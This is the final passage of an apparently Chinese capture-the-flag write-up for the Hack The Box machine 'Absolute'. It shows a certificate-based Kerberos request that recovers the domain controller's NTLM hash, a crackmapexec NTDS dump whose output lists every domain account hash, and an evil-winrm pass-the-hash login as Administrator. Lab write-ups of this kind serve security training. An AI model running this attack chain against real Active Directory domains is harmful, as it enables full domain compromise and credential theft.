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 /password:"qC4@dT8=yC3#" /getcredentials /show /nowrap`
结果如下：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1681482506482-f912a77d-6a37-4b63-bfa0-b44b4434326e.png#averageHue=%23313128&clientId=u508f3206-e774-4&from=paste&height=464&id=u395478aa&name=image.png&originHeight=580&originWidth=1509&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1081072&status=done&style=none&taskId=uc6a962b9-6590-424f-af05-449156beb3d&title=&width=1207.2)
```
 ServiceName              :  krbtgt/absolute.htb
  ServiceRealm             :  ABSOLUTE.HTB
  UserName                 :  DC$
  UserRealm                :  ABSOLUTE.HTB
  StartTime                :  4/14/2023 2:15:02 PM
  EndTime                  :  4/15/2023 12:15:02 AM
  RenewTill                :  4/21/2023 2:15:02 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  5nof/W0ESBd7w8OyGmW4Hw==
  ASREP (key)              :  A47858CF2FF48C80A45B26338A23DF63

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A7864AB463177ACB9AEC553F18F42577
```
最后使用CME模块dump 管理员的hash
`crackmapexec smb -dc-ip dc.absolute.htb -u 'DC$' -H A7864AB463177ACB9AEC553F18F42577 --ntds`
```
└─# crackmapexec smb -dc-ip dc.absolute.htb -u 'DC$' -H A7864AB463177ACB9AEC553F18F42577 --ntds
SMB         dc.absolute.htb 445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:c-ip) (signing:True) (SMBv1:False)
SMB         dc.absolute.htb 445    DC               [+] c-ip\DC$:A7864AB463177ACB9AEC553F18F42577
SMB         dc.absolute.htb 445    DC               [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
SMB         dc.absolute.htb 445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         dc.absolute.htb 445    DC               Administrator\Administrator:500:aad3b435b51404eeaad3b435b51404ee:1f4a6093623653f6488d5aa24c75f2ea:::
SMB         dc.absolute.htb 445    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         dc.absolute.htb 445    DC               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3ca378b063b18294fa5122c66c2280d4:::
SMB         dc.absolute.htb 445    DC               J.Roberts:1103:aad3b435b51404eeaad3b435b51404ee:7d6b7511772593b6d0a3d2de4630025a:::
SMB         dc.absolute.htb 445    DC               M.Chaffrey:1104:aad3b435b51404eeaad3b435b51404ee:13a699bfad06afb35fa0856f69632184:::
SMB         dc.absolute.htb 445    DC               D.Klay:1105:aad3b435b51404eeaad3b435b51404ee:21c95f594a80bf53afc78114f98fd3ab:::
SMB         dc.absolute.htb 445    DC               s.osvald:1106:aad3b435b51404eeaad3b435b51404ee:ab14438de333bf5a5283004f660879ee:::
SMB         dc.absolute.htb 445    DC               j.robinson:1107:aad3b435b51404eeaad3b435b51404ee:0c8cb4f338183e9e67bbc98231a8e59f:::
SMB         dc.absolute.htb 445    DC               n.smith:1108:aad3b435b51404eeaad3b435b51404ee:ef424db18e1ae6ba889fb12e8277797d:::
SMB         dc.absolute.htb 445    DC               m.lovegod:1109:aad3b435b51404eeaad3b435b51404ee:a22f2835442b3c4cbf5f24855d5e5c3d:::
SMB         dc.absolute.htb 445    DC               l.moore:1110:aad3b435b51404eeaad3b435b51404ee:0d4c6dccbfacbff5f8b4b31f57c528ba:::
SMB         dc.absolute.htb 445    DC               c.colt:1111:aad3b435b51404eeaad3b435b51404ee:fcad808a20e73e68ea6f55b268b48fe4:::
SMB         dc.absolute.htb 445    DC               s.johnson:1112:aad3b435b51404eeaad3b435b51404ee:b922d77d7412d1d616db10b5017f395c:::
SMB         dc.absolute.htb 445    DC               d.lemm:1113:aad3b435b51404eeaad3b435b51404ee:e16f7ab64d81a4f6fe47ca7c21d1ea40:::
SMB         dc.absolute.htb 445    DC               svc_smb:1114:aad3b435b51404eeaad3b435b51404ee:c31e33babe4acee96481ff56c2449167:::
SMB         dc.absolute.htb 445    DC               svc_audit:1115:aad3b435b51404eeaad3b435b51404ee:846196aab3f1323cbcc1d8c57f79a103:::
SMB         dc.absolute.htb 445    DC               winrm_user:1116:aad3b435b51404eeaad3b435b51404ee:8738c7413a5da3bc1d083efc0ab06cb2:::
SMB         dc.absolute.htb 445    DC               DC$:1000:aad3b435b51404eeaad3b435b51404ee:a7864ab463177acb9aec553f18f42577:::
SMB         dc.absolute.htb 445    DC               [+] Dumped 18 NTDS hashes to /root/.cme/logs/DC_dc.absolute.htb_2023-04-15_051536.ntds of which 17 were added to the database
```
` evil-winrm -i absolute.htb -u "Administrator" -H 1f4a6093623653f6488d5aa24c75f2ea`
结束了家人们
![image.png](https://cdn.nlark.com/yuque/0/2023/png/32634994/1681482165606-9d5939d4-ab02-43c1-ad33-bcc82c8253eb.png#averageHue=%232e2d26&clientId=u508f3206-e774-4&from=paste&height=141&id=u10870119&name=image.png&originHeight=176&originWidth=1063&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=263240&status=done&style=none&taskId=udd6ad99d-7f4a-4bac-bca2-2e3602df958&title=&width=850.4)
